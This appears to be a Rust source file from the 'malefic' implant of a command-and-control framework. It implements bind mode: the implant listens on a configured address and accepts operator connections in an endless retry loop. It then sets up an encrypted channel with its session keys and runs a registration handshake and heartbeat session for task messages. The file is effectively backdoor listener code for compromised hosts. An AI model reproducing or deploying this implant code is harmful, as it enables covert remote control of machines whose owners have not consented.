use malefic_common::debug;
use malefic_config as config;
use malefic_stub::channel::MaleficChannel;
use malefic_stub::stub::{build_connection, MaleficStub};
use malefic_transport::{ConnectionRunner, Listener, ListenerExt};

use crate::session_loop::{enforce_guardrail, BindStrategy, SessionLoop};

pub struct MaleficBind {
    stub: MaleficStub,
    listener: Listener,
    initialized: bool,
}

impl MaleficBind {
    pub async fn new(channel: MaleficChannel) -> anyhow::Result<Self> {
        // Get listening address from config
        let addr = config::SERVER_CONFIGS
            .first()
            .ok_or_else(|| anyhow::anyhow!("No server configured for bind mode"))?
            .address
            .clone();

        // Bind listening address
        let listener = Listener::bind(addr.as_str())
            .await
            .map_err(|e| {
                debug!("Failed to bind listener: {:#?}", e);
                panic!("Failed to bind listener");
            })
            .unwrap();

        debug!("Listening on {}", addr);

        Ok(Self::new_with_listener(
            MaleficStub::new([0; 4], channel),
            listener,
        ))
    }

    pub fn new_with_listener(stub: MaleficStub, listener: Listener) -> Self {
        MaleficBind {
            stub,
            listener,
            initialized: false,
        }
    }

    pub async fn run(&mut self) -> Result<(), ()> {
        loop {
            match self.run_once().await {
                Ok(()) => {}
                Err(e) => {
                    debug!("[bind] Runner error: {:?}, retrying accept...", e);
                    continue;
                }
            }
        }
    }

    pub async fn run_once(&mut self) -> anyhow::Result<()> {
        enforce_guardrail();

        let transport = self
            .listener
            .accept()
            .await
            .map_err(|e| anyhow::anyhow!("Failed to accept connection: {:#?}", e))?;

        let connection = build_connection(
            transport,
            self.stub.meta.get_uuid(),
            self.stub.meta.get_encrypt_key(),
            self.stub.meta.get_decrypt_key(),
        )
        .map_err(|e| anyhow::anyhow!("Failed to build connection: {:#?}", e))?;

        let runner = self.init(connection).await?;
        self.initialized = true;
        self.run_session(runner).await
    }

    pub async fn run_session(&mut self, mut runner: ConnectionRunner) -> anyhow::Result<()> {
        let mut session_loop = SessionLoop::new(BindStrategy);
        session_loop.run(&mut self.stub, &mut runner).await?;
        Ok(())
    }

    /// Bind initialization: receive init request and send registration response
    ///
    /// Returns initialized ConnectionRunner (Heartbeat mode)
    async fn init(
        &mut self,
        connection: malefic_transport::Connection,
    ) -> anyhow::Result<ConnectionRunner> {
        // Split connection to manually handle init flow
        let (mut reader, mut writer) = connection.split();

        // 1. Receive init request
        let received_spites = reader
            .receive()
            .await
            .map_err(|e| anyhow::anyhow!("Failed to receive init request: {:?}", e))?;

        debug!(
            "[bind init] Received init request with {} spites",
            received_spites.spites.len()
        );

        // 2. Process init
        self.stub
            .handler(received_spites)
            .await
            .map_err(|e| anyhow::anyhow!("Failed to handle init spites: {:?}", e))?;

        // 3. Prepare response
        let response_spites = self
            .stub
            .prepare_spites()
            .await
            .map_err(|e| anyhow::anyhow!("Failed to prepare response: {:?}", e))?;

        // 4. Send response
        writer
            .send(response_spites)
            .await
            .map_err(|e| anyhow::anyhow!("Failed to send register response: {:?}", e))?;

        debug!(
            "[bind init] Init success with session_id: {:?}",
            self.stub.meta.get_uuid()
        );

        // 5. Create Heartbeat Runner (default mode)
        let runner = ConnectionRunner::new_from_split(reader, writer);

        Ok(runner)
    }
}
